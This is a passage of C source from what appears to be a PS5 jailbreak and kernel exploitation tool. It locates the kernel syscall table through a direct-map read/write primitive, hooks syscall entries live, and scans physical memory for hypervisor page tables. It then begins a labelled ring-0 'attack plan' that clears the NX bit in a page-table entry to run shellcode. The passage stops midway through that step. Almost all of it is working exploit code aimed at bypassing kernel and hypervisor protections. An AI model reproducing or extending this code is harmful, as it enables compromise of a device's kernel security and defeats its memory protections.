            /* Fallback: scan kdata via DMAP for narg pattern */
            if (!sysent_found) {
                printf("[*] Scanning kdata for sysent table via DMAP...\n");
                fflush(stdout);

                /* FreeBSD syscall nargs for entries 0-6:
                 *   0=nosys(0), 1=exit(1), 2=fork(0),
                 *   3=read(3), 4=write(3), 5=open(3), 6=close(1) */
                static const int expected_nargs[] = {0, 1, 0, 3, 3, 3, 1};
                int match_size = SYSENT_STRIDE * 7;
                uint8_t blk[4096];
                int pages_ok = 0, pages_fail = 0;

                for (uint64_t pg = 0; pg < 0x4000000 && !sysent_found; pg += 4096) {
                    uint64_t kva = g_kdata_base + pg;
                    uint64_t pa = va_to_pa_quiet(kva);
                    if (!pa) { pages_fail++; continue; }
                    if (kernel_copyout(g_dmap_base + pa, blk, 4096) != 0) {
                        pages_fail++; continue;
                    }
                    pages_ok++;

                    for (int boff = 0; boff <= 4096 - match_size && !sysent_found; boff += 8) {
                        int match = 1;
                        for (int i = 0; i < 7 && match; i++) {
                            int32_t narg;
                            memcpy(&narg, &blk[boff + i * SYSENT_STRIDE], 4);
                            if (narg != expected_nargs[i]) match = 0;
                        }
                        if (match) {
                            uint64_t call0;
                            memcpy(&call0, &blk[boff + 8], 8);
                            if (call0 >= g_ktext_base && call0 < g_ktext_base + 0x2000000) {
                                sysent_kva = kva + boff;
                                sysent_found = 1;
                            }
                        }
                    }
                }
                if (!sysent_found)
                    printf("[-] Sysent not found (scanned %d pages, %d unmapped).\n",
                           pages_ok, pages_fail);
            }

            if (sysent_found) {
                /* Dump key syscalls via DMAP reads */
                printf("[*] Key sysent entries (sy_narg, sy_call -> ktext offset):\n");
                static const struct { int num; const char *name; } key_syscalls[] = {
                    {0, "nosys"}, {1, "exit"}, {2, "fork"}, {3, "read"},
                    {4, "write"}, {5, "open"}, {6, "close"},
                    {20, "getpid"}, {37, "kill"}, {54, "ioctl"},
                    {59, "execve"}, {73, "munmap"}, {74, "mprotect"},
                    {165, "sysarch"}, {202, "sysctl"},
                    {304, "kldload"}, {305, "kldunload"}, {308, "kldstat"},
                    {477, "mmap"}, {337, "kldsym"},
                };
                for (unsigned i = 0; i < sizeof(key_syscalls)/sizeof(key_syscalls[0]); i++) {
                    int num = key_syscalls[i].num;
                    uint64_t ent_kva = sysent_kva + (uint64_t)num * SYSENT_STRIDE;
                    uint64_t ent_pa = va_to_pa_quiet(ent_kva);
                    uint8_t entry[SYSENT_STRIDE];
                    int32_t narg = -1;
                    uint64_t sy_call = 0;
                    if (ent_pa) {
                        kernel_copyout(g_dmap_base + ent_pa, entry, SYSENT_STRIDE);
                        memcpy(&narg, entry, 4);
                        memcpy(&sy_call, entry + 8, 8);
                    }
                    printf("    [%3d] %-12s narg=%d  sy_call=0x%lx (ktext+0x%lx)\n",
                           num, key_syscalls[i].name, narg,
                           (unsigned long)sy_call,
                           (unsigned long)(sy_call - g_ktext_base));
                }
            }
            fflush(stdout);
        }

        /* 4d-5: Sysent verification and live hook test */
        if (sysent_found) {
            printf("\n[*] Verifying sysent table...\n");
            fflush(stdout);

            /* Get nosys handler address (entry 0) */
            uint64_t nosys_call = 0;
            {
                uint64_t pa = va_to_pa_quiet(sysent_kva + 8);
                if (pa) kernel_copyout(g_dmap_base + pa, &nosys_call, 8);
            }

            /* Cross-check narg values for known syscalls */
            static const struct { int num; int narg; const char *name; } verify[] = {
                {20, 0, "getpid"}, {37, 2, "kill"}, {54, 3, "ioctl"},
                {59, 3, "execve"}, {73, 2, "munmap"}, {74, 3, "mprotect"},
                {165, 2, "sysarch"}, {202, 6, "sysctl"}, {477, 6, "mmap"},
                {304, 1, "kldload"}, {305, 1, "kldunload"}, {308, 2, "kldstat"},
            };
            int narg_ok = 0, narg_total = 0;
            for (unsigned i = 0; i < sizeof(verify)/sizeof(verify[0]); i++) {
                uint64_t ent_kva = sysent_kva + (uint64_t)verify[i].num * SYSENT_STRIDE;
                uint64_t pa = va_to_pa_quiet(ent_kva);
                if (!pa) continue;
                int32_t narg;
                kernel_copyout(g_dmap_base + pa, &narg, 4);
                narg_total++;
                if (narg == verify[i].narg) narg_ok++;
                else printf("    MISMATCH: %s narg=%d expected=%d\n",
                            verify[i].name, narg, verify[i].narg);
            }
            printf("    narg cross-check: %d/%d matched\n", narg_ok, narg_total);

            /* Count nosys entries in high range (600-723) */
            int nosys_cnt = 0, checked = 0;
            for (int i = 600; i < 724; i++) {
                uint64_t pa = va_to_pa_quiet(sysent_kva + (uint64_t)i * SYSENT_STRIDE + 8);
                if (!pa) continue;
                uint64_t call;
                kernel_copyout(g_dmap_base + pa, &call, 8);
                checked++;
                if (call == nosys_call) nosys_cnt++;
            }
            printf("    nosys consistency: %d/%d high entries point to nosys (0x%lx)\n",
                   nosys_cnt, checked, (unsigned long)nosys_call);

            /* 12/12 narg match is strong proof. PS5 has ~117 custom Sony
             * syscalls in 600-723, so nosys count is just informational. */
            sysent_verified = (narg_ok == narg_total && narg_total >= 10);
            if (sysent_verified)
                printf("[+] Sysent table VERIFIED (12/12 narg match)!\n");
            else
                printf("[-] Sysent verification failed (%d/%d narg).\n",
                       narg_ok, narg_total);
            fflush(stdout);

            /* Live hook test: redirect an unused syscall to getpid handler */
            if (sysent_verified) {
                /* Find an unused (nosys) syscall — scan wide range */
                int test_sc = -1;
                for (int i = 723; i >= 500; i--) {
                    uint64_t pa = va_to_pa_quiet(
                        sysent_kva + (uint64_t)i * SYSENT_STRIDE + 8);
                    if (!pa) continue;
                    uint64_t call;
                    kernel_copyout(g_dmap_base + pa, &call, 8);
                    if (call == nosys_call) { test_sc = i; break; }
                }

                if (test_sc >= 0) {
                    printf("\n[*] Live sysent hook test: syscall %d\n", test_sc);

                    uint64_t ent_kva = sysent_kva + (uint64_t)test_sc * SYSENT_STRIDE;

                    /* Save original entry */
                    uint8_t orig_ent[SYSENT_STRIDE];
                    uint64_t ent_pa = va_to_pa_quiet(ent_kva);
                    kernel_copyout(g_dmap_base + ent_pa, orig_ent, SYSENT_STRIDE);

                    /* Read & display original sy_call */
                    uint64_t orig_call = 0;
                    uint64_t call_pa = va_to_pa_quiet(ent_kva + 8);
                    kernel_copyout(g_dmap_base + call_pa, &orig_call, 8);
                    printf("    Original sy_call: 0x%lx (nosys=0x%lx, match=%s)\n",
                           (unsigned long)orig_call, (unsigned long)nosys_call,
                           orig_call == nosys_call ? "YES" : "NO");

                    /* Call before modification */
                    errno = 0;
                    long ret0 = syscall(test_sc);
                    int err0 = errno;
                    printf("    Before: syscall(%d) = %ld, errno=%d (%s)\n",
                           test_sc, ret0, err0,
                           err0 == 78 ? "ENOSYS" : "other");

                    /* Get getpid sy_call address */
                    uint64_t getpid_pa = va_to_pa_quiet(
                        sysent_kva + 20ULL * SYSENT_STRIDE + 8);
                    uint64_t getpid_call = 0;
                    kernel_copyout(g_dmap_base + getpid_pa, &getpid_call, 8);
                    printf("    getpid sy_call: 0x%lx\n",
                           (unsigned long)getpid_call);

                    /* Write getpid handler into test syscall via DMAP */
                    kernel_copyin(&getpid_call, g_dmap_base + call_pa, 8);

                    /* Also set narg=0 to match getpid */
                    int32_t zero = 0;
                    uint64_t narg_pa = va_to_pa_quiet(ent_kva);
                    kernel_copyin(&zero, g_dmap_base + narg_pa, 4);

                    /* Read back to verify the DMAP write stuck */
                    uint64_t readback = 0;
                    kernel_copyout(g_dmap_base + call_pa, &readback, 8);
                    int write_ok = (readback == getpid_call);
                    printf("    DMAP write verify: wrote 0x%lx, read back 0x%lx [%s]\n",
                           (unsigned long)getpid_call, (unsigned long)readback,
                           write_ok ? "OK" : "MISMATCH");

                    /* Call after modification — should return our PID */
                    errno = 0;
                    long ret1 = syscall(test_sc);
                    int err1 = errno;
                    pid_t real_pid = getpid();
                    printf("    After:  syscall(%d) = %ld, errno=%d (real pid=%d)\n",
                           test_sc, ret1, err1, real_pid);

                    if (ret1 == real_pid && err1 == 0) {
                        printf("[+] SYSENT HOOK VERIFIED — full syscall dispatch control!\n");
                    } else if (write_ok && ret1 == ret0) {
                        /* Write succeeded but behavior unchanged —
                         * something else dispatches before sysent */
                        printf("[-] DMAP write verified but syscall behavior UNCHANGED.\n");
                        printf("    ret before=%ld, after=%ld (identical)\n", ret0, ret1);
                        printf("    etaHEN syscall wrapper likely intercepts before sysent.\n");
                        printf("[*] Investigating etaHEN dispatch path...\n");
                        fflush(stdout);

                        /* Dump the sysentvec structure for more context */
                        uint64_t sv_pa = va_to_pa_quiet(
                            g_kdata_base + 0x1401bb8ULL);
                        if (sv_pa) {
                            uint8_t sv_raw[64];
                            kernel_copyout(g_dmap_base + sv_pa, sv_raw, 64);
                            printf("    sysentvec[0..63]:\n      ");
                            for (int j = 0; j < 64; j++) {
                                printf("%02x ", sv_raw[j]);
                                if ((j & 15) == 15) printf("\n      ");
                            }
                            printf("\n");
                            /* sv_fixup is at offset 48 (syscall entry func ptr) */
                            uint64_t sv_fixup = 0;
                            memcpy(&sv_fixup, sv_raw + 48, 8);
                            printf("    sv_fixup (offset 48): 0x%lx",
                                   (unsigned long)sv_fixup);
                            if (sv_fixup >= g_ktext_base &&
                                sv_fixup < g_ktext_base + 0x2000000ULL)
                                printf(" (ktext+0x%lx)",
                                       (unsigned long)(sv_fixup - g_ktext_base));
                            printf("\n");
                        }

                        /* SAFE reverse test: hook a real but rarely-used syscall
                         * to getpid handler. If the result changes from its normal
                         * return value to our PID, sysent IS the dispatch table
                         * for standard syscalls.
                         *
                         * IMPORTANT: Do NOT hook getpid->nosys! That crashes the PS5
                         * because every kernel thread calling getpid() would hit nosys,
                         * causing cascading failures and a hard freeze.
                         *
                         * Using issetugid (syscall 253): returns 0 or 1 normally,
                         * narg=0. If hooked to getpid handler, should return our PID.
                         * Rarely called by kernel threads, so safe to modify briefly. */
                        printf("[*] Safe reverse test: hook sysent[253] (issetugid) to getpid...\n");
                        fflush(stdout);

                        /* Read original issetugid entry */
                        uint64_t issu_ent_kva = sysent_kva + 253ULL * SYSENT_STRIDE;
                        uint64_t issu_call_pa = va_to_pa_quiet(issu_ent_kva + 8);
                        uint64_t issu_narg_pa = va_to_pa_quiet(issu_ent_kva);
                        uint64_t issu_orig_call = 0;
                        int32_t issu_orig_narg = 0;
                        if (issu_call_pa && issu_narg_pa) {
                            kernel_copyout(g_dmap_base + issu_call_pa, &issu_orig_call, 8);
                            kernel_copyout(g_dmap_base + issu_narg_pa, &issu_orig_narg, 4);
                        }
                        printf("    sysent[253] original: sy_call=0x%lx, narg=%d\n",
                               (unsigned long)issu_orig_call, issu_orig_narg);

                        if (!issu_call_pa || issu_orig_call == 0) {
                            printf("[-] Can't read sysent[253], skipping reverse test.\n");
                        } else {
                            /* Call issetugid before hook */
                            errno = 0;
                            long issu_before = syscall(253);
                            int issu_err0 = errno;
                            printf("    Before hook: issetugid()=%ld, errno=%d\n",
                                   issu_before, issu_err0);

                            /* Save full entry for restore */
                            uint8_t issu_orig_ent[SYSENT_STRIDE];
                            uint64_t issu_ent_pa = va_to_pa_quiet(issu_ent_kva);
                            kernel_copyout(g_dmap_base + issu_ent_pa,
                                           issu_orig_ent, SYSENT_STRIDE);

                            /* Write getpid handler into issetugid */
                            kernel_copyin(&getpid_call, g_dmap_base + issu_call_pa, 8);
                            /* Set narg=0 to match getpid */
                            int32_t zero_narg = 0;
                            kernel_copyin(&zero_narg, g_dmap_base + issu_narg_pa, 4);

                            /* Verify write */
                            uint64_t issu_rb = 0;
                            kernel_copyout(g_dmap_base + issu_call_pa, &issu_rb, 8);
                            printf("    After write: sy_call=0x%lx (%s)\n",
                                   (unsigned long)issu_rb,
                                   issu_rb == getpid_call ? "OK" : "MISMATCH");

                            /* Call issetugid after hook — should return PID */
                            errno = 0;
                            long issu_after = syscall(253);
                            int issu_err1 = errno;
                            printf("    After hook:  issetugid()=%ld, errno=%d (pid=%d)\n",
                                   issu_after, issu_err1, real_pid);

                            /* Restore IMMEDIATELY */
                            kernel_copyin(issu_orig_ent,
                                          g_dmap_base + issu_ent_pa, SYSENT_STRIDE);
                            printf("    Restored sysent[253]\n");

                            if (issu_after == (long)real_pid && issu_err1 == 0) {
                                printf("[+] SYSENT HOOK CONFIRMED for standard syscalls!\n");
                                printf("    Kernel dispatches real syscalls through sysent.\n");
                                printf("    etaHEN only intercepts high/custom syscalls.\n");
                                printf("    This means: hook any standard sysent entry\n");
                                printf("    → execution redirected to chosen kernel function.\n");
                            } else if (issu_after == issu_before &&
                                       issu_err1 == issu_err0) {
                                printf("[-] issetugid unchanged — etaHEN intercepts all.\n");
                            } else {
                                printf("[?] Unexpected: before=%ld, after=%ld\n",
                                       issu_before, issu_after);
                                printf("    Partial sysent dispatch? Needs investigation.\n");
                            }
                        }
                    } else if (!write_ok) {
                        printf("[-] DMAP write FAILED — sysent page is write-protected.\n");
                    } else {
                        printf("[-] Sysent hook result unexpected: ret=%ld, errno=%d\n",
                               ret1, err1);
                        printf("    Write verified OK but behavior unclear.\n");
                    }

                    /* Restore original entry */
                    kernel_copyin(orig_ent, g_dmap_base + ent_pa, SYSENT_STRIDE);
                    printf("    Restored sysent[%d]\n", test_sc);
                    fflush(stdout);
                } else {
                    printf("[-] No unused nosys syscall found in 500-723.\n");
                }
            }
        }

        /* ================================================================
         * NPT (Nested Page Table) Discovery Scan
         * ================================================================
         * Goal: Find the PS5 hypervisor's page table structures that
         * enforce W^X on kernel memory.  Entirely read-only via DMAP.
         *
         * Strategy:
         *   1. Scan guest physical memory for VMCB (contains nCR3 = NPT root)
         *      - VMCB has guest CR3 at save-state offset 0x580
         *   2. Scan for page table pages referencing known kdata/ktext PAs
         *   3. Map out which PA ranges are guest-accessible vs HV-protected
         *
         * AMD NPT entry format (8 bytes):
         *   Bit 0:     Present
         *   Bit 1:     Read/Write
         *   Bit 2:     User/Supervisor
         *   Bit 7:     Page Size (2MB at PD level)
         *   Bits 12-51: Physical page frame number
         *   Bit 63:    NX (No Execute)
         * ================================================================ */
        {
            printf("\n=============================================\n");
            printf("  NPT Discovery: HV Page Table Scan\n");
            printf("=============================================\n\n");
            fflush(stdout);

            /* Get known physical addresses for signature matching */
            uint64_t ktext_pa = va_to_pa_quiet(g_ktext_base);
            uint64_t kdata_pa = va_to_pa_quiet(g_kdata_base);
            uint64_t ktext_2mb = ktext_pa & ~0x1FFFFFULL;
            uint64_t kdata_2mb = kdata_pa & ~0x1FFFFFULL;

            printf("[*] Search signatures:\n");
            printf("    ktext PA  = 0x%lx (2MB page: 0x%lx)\n",
                   (unsigned long)ktext_pa, (unsigned long)ktext_2mb);
            printf("    kdata PA  = 0x%lx (2MB page: 0x%lx)\n",
                   (unsigned long)kdata_pa, (unsigned long)kdata_2mb);
            printf("    Guest CR3 = 0x%lx\n", (unsigned long)g_cr3_phys);
            printf("    Scan range: PA 0x0 → 0x20000000 (512MB)\n");
            fflush(stdout);

            uint8_t scan_pg[4096];
            int npt_ok = 0, npt_fail = 0;
            int vmcb_found = 0;
            int pt_pages_with_refs = 0;
            /* Track which 2MB regions are accessible vs blocked */
            int accessible_2mb = 0, blocked_2mb = 0;
            uint64_t first_blocked = 0, last_blocked = 0;

            /* Phase 1: Scan for VMCB and PT structures */
            for (uint64_t pa = 0; pa < 0x20000000ULL; pa += 0x1000) {
                /* Progress every 64MB */
                if ((pa & 0x3FFFFFF) == 0 && pa > 0) {
                    printf("    Scan: %luMB/512MB (%d OK, %d blocked, "
                           "%d PT refs found)\n",
                           (unsigned long)(pa >> 20), npt_ok, npt_fail,
                           pt_pages_with_refs);
                    fflush(stdout);
                }

                /* Track 2MB-region accessibility */
                if ((pa & 0x1FFFFF) == 0) {
                    /* Test first page of each 2MB region */
                    if (kernel_copyout(g_dmap_base + pa, scan_pg, 8) != 0) {
                        blocked_2mb++;
                        if (!first_blocked) first_blocked = pa;
                        last_blocked = pa;
                        pa += 0x1FFFFF; /* Skip rest of blocked 2MB region */
                        npt_fail += 512;
                        continue;
                    }
                    accessible_2mb++;
                }

                if (kernel_copyout(g_dmap_base + pa, scan_pg, 4096) != 0) {
                    npt_fail++;
                    continue;
                }
                npt_ok++;

                uint64_t *ents = (uint64_t *)scan_pg;

                /* Check for VMCB: guest CR3 at save-state offset 0x580 */
                if (g_cr3_phys != 0) {
                    uint64_t v580 = 0;
                    memcpy(&v580, scan_pg + 0x580, 8);
                    /* CR3 match (mask out PCID bits in low 12) */
                    if ((v580 & ~0xFFFULL) == (g_cr3_phys & ~0xFFFULL) &&
                        v580 != 0) {
                        printf("\n[!] VMCB candidate at PA 0x%lx!\n",
                               (unsigned long)pa);
                        printf("    offset 0x580 (CR3): 0x%lx\n",
                               (unsigned long)v580);
                        vmcb_found++;

                        /* Dump likely nCR3 locations in control area */
                        printf("    Control area (possible nCR3):\n");
                        for (int off = 0x40; off <= 0xB0; off += 8) {
                            uint64_t val;
                            memcpy(&val, scan_pg + off, 8);
                            /* nCR3 should be page-aligned, non-zero,
                             * reasonable PA */
                            if (val != 0 && (val & 0xFFF) == 0 &&
                                val < 0x800000000ULL) {
                                printf("      [0x%03x] = 0x%lx", off,
                                       (unsigned long)val);
                                /* Try to read the page it points to */
                                uint8_t probe[8];
                                if (kernel_copyout(g_dmap_base + val,
                                                   probe, 8) == 0) {
                                    uint64_t first_e;
                                    memcpy(&first_e, probe, 8);
                                    printf(" (readable, first entry:"
                                           " 0x%lx)", (unsigned long)first_e);
                                } else {
                                    printf(" (NOT readable from guest)");
                                }
                                printf("\n");
                            }
                        }
                        /* Also dump some save-state area for context */
                        printf("    Save state context:\n");
                        /* CR0 at 0x588, CR4 at 0x578, EFER at 0x550 */
                        uint64_t v_cr0, v_cr4, v_efer;
                        memcpy(&v_efer, scan_pg + 0x550, 8);
                        memcpy(&v_cr4, scan_pg + 0x578, 8);
                        memcpy(&v_cr0, scan_pg + 0x588, 8);
                        printf("      EFER(0x550)=0x%lx CR4(0x578)=0x%lx"
                               " CR0(0x588)=0x%lx\n",
                               (unsigned long)v_efer, (unsigned long)v_cr4,
                               (unsigned long)v_cr0);
                        fflush(stdout);
                    }
                }

                /* Check if this page has PT entries referencing
                 * kdata or ktext physical addresses */
                int kdata_refs = 0, ktext_refs = 0;
                int present_cnt = 0;
                for (int i = 0; i < 512; i++) {
                    uint64_t e = ents[i];
                    if (!(e & 1)) continue;
                    present_cnt++;

                    uint64_t e_pa = e & 0x000FFFFFFFFFF000ULL;
                    int is_2mb = (e & 0x80) != 0;

                    if (is_2mb) {
                        uint64_t e_2mb = e_pa & ~0x1FFFFFULL;
                        if (e_2mb == kdata_2mb) kdata_refs++;
                        if (e_2mb == ktext_2mb) ktext_refs++;
                    } else {
                        /* 4KB entry or PT pointer — check if PA is in
                         * kdata/ktext range (within 32MB) */
                        if (e_pa >= kdata_pa &&
                            e_pa < kdata_pa + 0x2000000)
                            kdata_refs++;
                        if (e_pa >= ktext_pa &&
                            e_pa < ktext_pa + 0x2000000)
                            ktext_refs++;
                    }
                }

                if (kdata_refs > 0 || ktext_refs > 0) {
                    pt_pages_with_refs++;
                    printf("\n[!] PT page at PA 0x%lx: %d present entries, "
                           "%d kdata refs, %d ktext refs\n",
                           (unsigned long)pa, present_cnt,
                           kdata_refs, ktext_refs);

                    /* Dump matching entries */
                    for (int i = 0; i < 512; i++) {
                        uint64_t e = ents[i];
                        if (!(e & 1)) continue;
                        uint64_t e_pa = e & 0x000FFFFFFFFFF000ULL;
                        int is_2mb = (e & 0x80) != 0;
                        int match = 0;
                        if (is_2mb) {
                            uint64_t e_2mb = e_pa & ~0x1FFFFFULL;
                            if (e_2mb == kdata_2mb ||
                                e_2mb == ktext_2mb) match = 1;
                        } else {
                            if ((e_pa >= kdata_pa &&
                                 e_pa < kdata_pa + 0x2000000) ||
                                (e_pa >= ktext_pa &&
                                 e_pa < ktext_pa + 0x2000000))
                                match = 1;
                        }
                        if (match) {
                            printf("    [%3d] 0x%016lx → PA=0x%lx "
                                   "%s %s %s %s\n",
                                   i, (unsigned long)e, (unsigned long)e_pa,
                                   is_2mb ? "2MB" : "4KB",
                                   (e & 2) ? "RW" : "RO",
                                   (e & 4) ? "User" : "Kern",
                                   (e >> 63) ? "NX" : "X");
                        }
                    }
                    fflush(stdout);
                }
            }

            printf("\n[*] NPT scan summary:\n");
            printf("    Pages scanned:   %d OK, %d blocked\n",
                   npt_ok, npt_fail);
            printf("    2MB regions:     %d accessible, %d blocked\n",
                   accessible_2mb, blocked_2mb);
            if (first_blocked)
                printf("    Blocked range:   first=0x%lx, last=0x%lx\n",
                       (unsigned long)first_blocked,
                       (unsigned long)last_blocked);
            printf("    VMCB candidates: %d\n", vmcb_found);
            printf("    PT pages w/ kdata/ktext refs: %d\n",
                   pt_pages_with_refs);

            if (vmcb_found == 0 && pt_pages_with_refs == 0) {
                printf("\n[*] HV structures not found in guest-accessible memory.\n");
                printf("    The hypervisor likely protects its page tables.\n");
                printf("    Alternative: use sysent hook to call kernel pmap\n");
                printf("    functions (e.g. pmap_protect) from ring 0 to\n");
                printf("    change page permissions from inside the kernel.\n");
            }
            printf("\n");
            fflush(stdout);

            /* ── Guest Page Table Walk: check where NX is enforced ──
             *
             * The NPT scan found identity-mapping PD tables at PA 0x6a000
             * and 0x6e000 where BOTH ktext and kdata are RW+X (no NX).
             * This means NX enforcement is likely in the guest page tables.
             *
             * Walk the guest PT (from CR3) for both kdata and ktext,
             * dumping entries at each level with full permission bits.
             * If NX is in the guest PTE, we can clear it via DMAP write. */
            printf("=============================================\n");
            printf("  Guest Page Table Walk: Permission Analysis\n");
            printf("=============================================\n\n");
            fflush(stdout);

            uint64_t walk_targets[] = {
                g_ktext_base,
                g_kdata_base,
                g_kdata_base + 0x1000, /* kdata + 1 page */
            };
            const char *walk_names[] = {
                "ktext_base",
                "kdata_base",
                "kdata+0x1000",
            };
            int n_walks = 3;

            for (int w = 0; w < n_walks; w++) {
                uint64_t va = walk_targets[w];
                printf("[*] Walking guest PT for %s (VA=0x%lx):\n",
                       walk_names[w], (unsigned long)va);

                int pml4_idx = (va >> 39) & 0x1FF;
                int pdp_idx  = (va >> 30) & 0x1FF;
                int pd_idx   = (va >> 21) & 0x1FF;
                int pt_idx   = (va >> 12) & 0x1FF;
                printf("    Indices: PML4[%d] PDP[%d] PD[%d] PT[%d]\n",
                       pml4_idx, pdp_idx, pd_idx, pt_idx);

                /* PML4E */
                uint64_t pml4e = 0;
                uint64_t pml4e_pa = g_cr3_phys + pml4_idx * 8;
                kernel_copyout(g_dmap_base + pml4e_pa, &pml4e, 8);
                printf("    PML4E: 0x%016lx (PA of entry: 0x%lx)\n",
                       (unsigned long)pml4e, (unsigned long)pml4e_pa);
                printf("           P=%d RW=%d US=%d PWT=%d PCD=%d A=%d"
                       " NX=%d → next PA=0x%lx\n",
                       (int)(pml4e & 1), (int)((pml4e >> 1) & 1),
                       (int)((pml4e >> 2) & 1), (int)((pml4e >> 3) & 1),
                       (int)((pml4e >> 4) & 1), (int)((pml4e >> 5) & 1),
                       (int)(pml4e >> 63),
                       (unsigned long)(pml4e & PTE_PA_MASK));
                if (!(pml4e & PTE_PRESENT)) {
                    printf("    [STOP] PML4E not present.\n\n");
                    continue;
                }

                /* PDPE */
                uint64_t pdpe = 0;
                uint64_t pdpe_pa = (pml4e & PTE_PA_MASK) + pdp_idx * 8;
                kernel_copyout(g_dmap_base + pdpe_pa, &pdpe, 8);
                printf("    PDPE:  0x%016lx (PA of entry: 0x%lx)\n",
                       (unsigned long)pdpe, (unsigned long)pdpe_pa);
                printf("           P=%d RW=%d US=%d PWT=%d PCD=%d A=%d"
                       " PS=%d NX=%d → next PA=0x%lx\n",
                       (int)(pdpe & 1), (int)((pdpe >> 1) & 1),
                       (int)((pdpe >> 2) & 1), (int)((pdpe >> 3) & 1),
                       (int)((pdpe >> 4) & 1), (int)((pdpe >> 5) & 1),
                       (int)((pdpe >> 7) & 1), (int)(pdpe >> 63),
                       (unsigned long)(pdpe & PTE_PA_MASK));
                if (!(pdpe & PTE_PRESENT)) {
                    printf("    [STOP] PDPE not present.\n\n");
                    continue;
                }
                if (pdpe & PTE_PS) {
                    printf("    [1GB page] Final PA=0x%lx\n\n",
                           (unsigned long)((pdpe & 0xFFFFC0000000ULL) |
                                           (va & 0x3FFFFFFF)));
                    continue;
                }

                /* PDE */
                uint64_t pde = 0;
                uint64_t pde_pa = (pdpe & PTE_PA_MASK) + pd_idx * 8;
                kernel_copyout(g_dmap_base + pde_pa, &pde, 8);
                printf("    PDE:   0x%016lx (PA of entry: 0x%lx)\n",
                       (unsigned long)pde, (unsigned long)pde_pa);
                printf("           P=%d RW=%d US=%d PWT=%d PCD=%d A=%d"
                       " D=%d PS=%d G=%d NX=%d → next PA=0x%lx\n",
                       (int)(pde & 1), (int)((pde >> 1) & 1),
                       (int)((pde >> 2) & 1), (int)((pde >> 3) & 1),
                       (int)((pde >> 4) & 1), (int)((pde >> 5) & 1),
                       (int)((pde >> 6) & 1), (int)((pde >> 7) & 1),
                       (int)((pde >> 8) & 1), (int)(pde >> 63),
                       (unsigned long)(pde & PTE_PA_MASK));
                if (!(pde & PTE_PRESENT)) {
                    printf("    [STOP] PDE not present.\n\n");
                    continue;
                }
                if (pde & PTE_PS) {
                    printf("    [2MB page] Final PA=0x%lx\n",
                           (unsigned long)((pde & 0xFFFFFFE00000ULL) |
                                           (va & 0x1FFFFF)));
                    printf("    >>> NX=%d RW=%d — this controls"
                           " execution permission\n\n",
                           (int)(pde >> 63), (int)((pde >> 1) & 1));
                    /* Report PDE physical address for potential mod */
                    printf("    PDE at PA 0x%lx — writable via DMAP"
                           " 0x%lx\n\n",
                           (unsigned long)pde_pa,
                           (unsigned long)(g_dmap_base + pde_pa));
                    continue;
                }

                /* PTE */
                uint64_t pte = 0;
                uint64_t pte_pa = (pde & PTE_PA_MASK) + pt_idx * 8;
                kernel_copyout(g_dmap_base + pte_pa, &pte, 8);
                printf("    PTE:   0x%016lx (PA of entry: 0x%lx)\n",
                       (unsigned long)pte, (unsigned long)pte_pa);
                printf("           P=%d RW=%d US=%d PWT=%d PCD=%d A=%d"
                       " D=%d PAT=%d G=%d NX=%d → PA=0x%lx\n",
                       (int)(pte & 1), (int)((pte >> 1) & 1),
                       (int)((pte >> 2) & 1), (int)((pte >> 3) & 1),
                       (int)((pte >> 4) & 1), (int)((pte >> 5) & 1),
                       (int)((pte >> 6) & 1), (int)((pte >> 7) & 1),
                       (int)((pte >> 8) & 1), (int)(pte >> 63),
                       (unsigned long)(pte & PTE_PA_MASK));
                if (!(pte & PTE_PRESENT)) {
                    printf("    [STOP] PTE not present.\n\n");
                    continue;
                }

                printf("    >>> NX=%d RW=%d — this controls"
                       " execution permission\n",
                       (int)(pte >> 63), (int)((pte >> 1) & 1));
                printf("    PTE at PA 0x%lx — writable via DMAP 0x%lx\n\n",
                       (unsigned long)pte_pa,
                       (unsigned long)(g_dmap_base + pte_pa));
            }
            fflush(stdout);
        }

        /* ================================================================
         * Ring-0 Shellcode Execution via Guest PTE NX-bit Clear
         * ================================================================
         *
         * PROVEN: NPT maps kdata as RW+X (no NX at PA 0x6a000/0x6e000).
         * PROVEN: Guest PTE for kdata has NX=1 (bit 63) — the ONLY barrier.
         * PROVEN: Sysent hooks redirect standard syscalls to any ktext addr.
         *
         * Attack plan:
         *   1. Write minimal shellcode to kdata code cave via DMAP
         *   2. Clear NX+G in the guest PTE via DMAP write
         *   3. Hook sysent[253] (issetugid) to point to shellcode
         *   4. Call syscall(253) → ring-0 execution!
         *   5. Restore PTE + sysent + code cave content
         *
         * TLB concern: PTE has A=0 → page likely not in TLB.
         * We clear G too so CR3 reloads will flush if cached.
         * ================================================================ */
        if (sysent_verified && sysent_kva != 0) {
            printf("=============================================\n");
            printf("  Ring-0 Execution: PTE NX-bit Clear Attack\n");
            printf("=============================================\n\n");
            fflush(stdout);

            /* Target: kdata_base (first page, known code cave) */
            uint64_t target_kva = g_kdata_base;
            uint64_t target_pa = va_to_pa_quiet(target_kva);

            /* Walk guest PT to find the PTE for target_kva */
            uint64_t walk_e;
            uint64_t walk_pa;
            /* PML4 → PDP → PD → PTE */
            walk_pa = g_cr3_phys + ((target_kva >> 39) & 0x1FF) * 8;
            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
            if (!(walk_e & PTE_PRESENT)) goto r0_skip;

            walk_pa = (walk_e & PTE_PA_MASK) +
                      ((target_kva >> 30) & 0x1FF) * 8;
            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
            if (!(walk_e & PTE_PRESENT)) goto r0_skip;
            if (walk_e & PTE_PS) {
                printf("[-] kdata mapped as 1GB page, not 4KB PTE.\n");
                goto r0_skip;
            }

            walk_pa = (walk_e & PTE_PA_MASK) +
                      ((target_kva >> 21) & 0x1FF) * 8;
            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
            if (!(walk_e & PTE_PRESENT)) goto r0_skip;
            /* Check for 2MB page — handle differently */
            uint64_t pte_pa;
            uint64_t orig_pte;
            int is_pde_2mb = (walk_e & PTE_PS) != 0;
            if (is_pde_2mb) {
                /* PDE is the final level (2MB page) */
                pte_pa = (walk_e & PTE_PA_MASK) +
                         ((target_kva >> 21) & 0x1FF) * 8;
                /* Re-read using the PDE address */
                pte_pa = walk_pa; /* walk_pa IS the PDE address */
                kernel_copyout(g_dmap_base + pte_pa, &orig_pte, 8);
                printf("[*] kdata mapped as 2MB page (PDE at PA 0x%lx)\n",
                       (unsigned long)pte_pa);
            } else {
                /* Walk to PT level */
                walk_pa = (walk_e & PTE_PA_MASK) +
                          ((target_kva >> 12) & 0x1FF) * 8;
                kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
                if (!(walk_e & PTE_PRESENT)) goto r0_skip;
                pte_pa = walk_pa;
                orig_pte = walk_e;
            }

